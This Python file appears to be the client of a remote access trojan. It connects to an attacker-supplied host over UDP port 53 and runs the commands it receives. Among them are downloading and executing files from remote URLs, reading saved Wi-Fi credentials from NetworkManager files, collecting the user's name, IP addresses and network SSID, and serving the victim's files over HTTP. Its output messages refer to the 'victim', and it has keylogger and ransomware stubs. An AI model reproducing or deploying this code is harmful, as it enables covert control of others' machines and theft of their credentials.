import socket
import os
import subprocess
import sys
import requests

SERVER_HOST = "<yourip>"
SERVER_PORT = 53
BUFFER_SIZE = 1024 * 128

os.system("mkdir /usr/share/temp/")

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((SERVER_HOST, SERVER_PORT))
message = "connected! "
s.send(message.encode())



def get_Local_ipv6_address_linux():
    """
        Get local ipv6
    """
    linelist = os.popen(
        ''' ip addr show eth0 | grep "inet6.*global" | awk \'{print $2}\' | awk -F"/" \'{print $1}\' ''').readlines()  # ????????list
    if linelist:
        content = linelist[0].strip()
    else:
        return None
    ipv6_pattern = '(([a-f0-9]{1,4}:){7}[a-f0-9]{1,4})'

    m = re.search(ipv6_pattern, content)

    if m is not None:
        return m.group()
    else:
        return None 
def Download(url, path):
	response = requests.get(url)
	open(path, "wb").write(response.content)
def hostscript():
	if os.path.exists("/usr/share/temp/host/pannel/"):
		os.chdir('/usr/share/temp/host/pannel/')
		os.system("python -m http.server 80")
	else:
		os.system("mkdir /usr/share/temp/host/")
		os.system("mkdir /usr/share/temp/host/pannel/")
		os.system("mkdir /usr/share/temp/host/pannel/keylogger/")
		os.system("mkdir /usr/share/temp/host/pannel/screenshots/")
		os.system("mkdir /usr/share/temp/host/pannel/sites/")
		os.system("mkdir /usr/share/temp/host/pannel/temp/")
		hostname2 = socket.gethostname()   
		username2 = os.getlogin()
		ipv42 = s.getsockname()[0]
		ipv62 = get_Local_ipv6_address_linux()
		netssid2 = os.popen("iwgetid -r").read()
		infos = f"""
Username: {username2}
IPV4: {ipv42}
IPV6: {ipv62}
HostName: {hostname2}
Network SSID: {netssid2}"""
		f = open("/usr/share/temp/host/pannel/user_profile.txt", "a")
		f.write(infos)
		f.close()
		os.chdir('/usr/share/temp/host/pannel/')
		os.system("python -m http.server 80")
while True:
	command = s.recv(BUFFER_SIZE).decode()
	splited_command = command.split()
	if command.lower() == "" or command.lower() == " ":
		output = ""
		pass
	elif command.lower() == "exit":
			break
	elif splited_command[0].lower() == "open":
			arg1 = splited_command[1].lower()
			os.system(f"exec {arg1}")
			output = f"The program {splited_command[1].lower()} is opened!"
	elif splited_command[0].lower() == "clear" or splited_command[0].lower() == "cls":
		output = ""
	elif splited_command[0].lower() == "skull":
		output = "A skull with crossbones spawned on victim's computer!"
		Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/troll/skull.sh", "/usr/share/temp/skull.sh")
		os.system("chmod +x /usr/share/temp/skull.sh")
		os.system("xterm -e /usr/share/temp/skull.sh")
	elif splited_command[0].lower() == "rickroll":
		output = "Victim just get rickrolled!"
		os.system("python -mwebbrowser https://www.youtube.com/watch?v=dQw4w9WgXcQ")
	elif splited_command[0].lower() == "help":
		output = ""
	elif splited_command[0].lower() == "info":
		hostname = socket.gethostname()   
		username = os.getlogin()
		ipv4 = s.getsockname()[0]
		ipv6 = get_Local_ipv6_address_linux()
		netssid = os.popen("iwgetid -r").read()
		output = f"""
Username: {username}
IPV4: {ipv4}
IPV6: {ipv6}
HostName: {hostname}
Network SSID: {netssid}"""
	elif splited_command[0].lower() == "host":
		if len(splited_command) == 2:
			if splited_command[1].lower() == "start":
				output = "Hosting at http://<victim's ip>! "
				hostscript()
			elif splited_command[1].lower() == "stop":
				output = "Hosting stopped."
			else:
				output = "Usage: host <start/stop>"
		else:
			output = "Usage: host <start/stop>"
	elif splited_command[0].lower() == "download":
			if len(splited_command) == 3:
				output = "Downloaded!"
				response = requests.get(splited_command[1])
				# 3. Open the response into a new file called instagram.ico
				open(splited_command[2], "wb").write(response.content)
			else:
				output = "Usage: download <url> <path>"
	elif splited_command[0].lower() == "network_info":
			netssid = os.popen("iwgetid -r").read()
			output = "Nothing to say"
			for filename in os.listdir("/etc/NetworkManager/system-connections/"):
				if netssid in filename:
					output = os.popen("cat /etc/NetworkManager/system-connections/" + filename).read()
					break
				else:
					continue
	elif splited_command[0].lower() == "notif":
			notif_msg = command.replace("notif ", "")
			os.system(f"notify-send '{notif_msg}'")
			output = "A notification appears to victim's machine"
	elif splited_command[0].lower() == "malware":
			if splited_command[1].lower() == "keylogger":
				output = "keylogger"
			elif splited_command[1].lower() == "ransomware":
				output = "ransomware"
			elif splited_command[1].lower() == "--help":
				output = ""
	else:
		output = f"The command {splited_command[0].lower()} does not exist"
	output = output + " "
	message = f"{output}"
	s.send(message.encode())
# close client connection
s.close()